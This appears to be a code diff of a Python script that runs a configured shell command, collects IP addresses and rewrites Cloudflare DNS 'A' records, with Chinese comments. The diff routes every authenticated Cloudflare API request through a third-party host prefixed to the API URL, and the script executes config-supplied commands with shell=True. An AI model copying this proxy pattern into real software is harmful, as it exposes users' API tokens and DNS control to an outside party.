@@ -16,29 +16,17 @@ result_file = os.path.join(script_directory, "result.csv")
 ip_result_file = 'push-ip.txt'
 
 def run_command_from_config():
-    error_encountered = False  # 初始化错误标志为False
-
     if os.path.exists(config_file):
         with open(config_file, "r") as config:
             config_data = json.load(config)
             command = config_data["command"]
             # 直接执行命令
-            result = subprocess.call(command, shell=True)
-            if result != 0:
-                print("执行命令时出错")
-                error_encountered = True  # 设置错误标志为True
-
-        if not error_encountered:
-            extract_top_ips()
+            subprocess.call(command, shell=True)
+        extract_top_ips()
     else:
-        print("未找到配置文件，请先配置参数.")
-        error_encountered = True  # 设置错误标志为True
-
-    return not error_encountered  # 返回True表示没有遇到错误，可以继续执行下面的代码
+        print("未找到配置文件，请先配置参数。")
 
 def extract_top_ips():
-    error_encountered = False  # 初始化错误标志为False
-
     if os.path.exists(result_file):
         with open(result_file, "r") as csv_file:
             csv_reader = csv.reader(csv_file)
@@ -55,12 +43,9 @@ def extract_top_ips():
         with open(ip_result_file, "w") as top_ips_file:
             top_ips_file.write("\n".join(ips))
 
-        print("需要推送的 IP 已保存到push-ip.txt.")
+        print("需要推送的 IP 已保存到push-ip.txt。")
     else:
         print("未找到 result.csv 文件，请确保命令执行成功并生成该文件.")
-        error_encountered = True  # 设置错误标志为True
-
-    return not error_encountered  # 返回True表示没有遇到错误，可以继续执行下面的代码
 
 def configure_dns_records():
     # 从 'cf-dns.json' 获取DNS配置
@@ -86,7 +71,7 @@ def configure_dns_records():
         }
 
         # DNS记录的基本URL
-        base_url = f"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records"
+        base_url = f"https://ymy.gay/https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records"
 
         # 删除所有'A'记录
         print("\n正在删除所有 DNS 'A'记录")
@@ -99,12 +84,10 @@ def configure_dns_records():
                     delete_url = f"{base_url}/{record['id']}"
                     response = requests.delete(delete_url, headers=headers)
                     if response.status_code != 200:
-                        print(f"删除'A'记录时出错，HTTP响应代码：{response.status_code}")
-                        return False  # 设置错误标志为True
+                        raise Exception(f"删除'A'记录时出错，HTTP响应代码：{response.status_code}")
             print("已删除所有DNS 'A'记录")
         else:
-            print(f"无法获取DNS记录信息。响应代码: {response.status_code}")
-            return False  # 设置错误标志为True
+            raise Exception(f"无法获取DNS记录信息。响应代码: {response.status_code}")
 
         # 创建新的'A'记录
         for ip in ip_addresses:
@@ -123,17 +106,10 @@ def configure_dns_records():
                 print(f"成功创建 (IPv4) DNS记录，IP地址: {ip}")
             else:
                 print("创建DNS记录时出错")
-                print(f"创建DNS记录时出错，HTTP响应代码：{response.status_code}")
-                return False  # 设置错误标志为True
-
+                raise Exception(f"创建DNS记录时出错，HTTP响应代码：{response.status_code}")
     else:
-        print("未配置DNS参数 cf-dns.json.")
-        return False  # 设置错误标志为True
+        print("未配置DNS参数 cf-dns.json 。")
 
-    return True  # 返回True表示没有遇到错误
-
-# 主函数
 if __name__ == "__main__":
-    if run_command_from_config():
-        if extract_top_ips():
-            configure_dns_records()
+    run_command_from_config()
+    configure_dns_records()
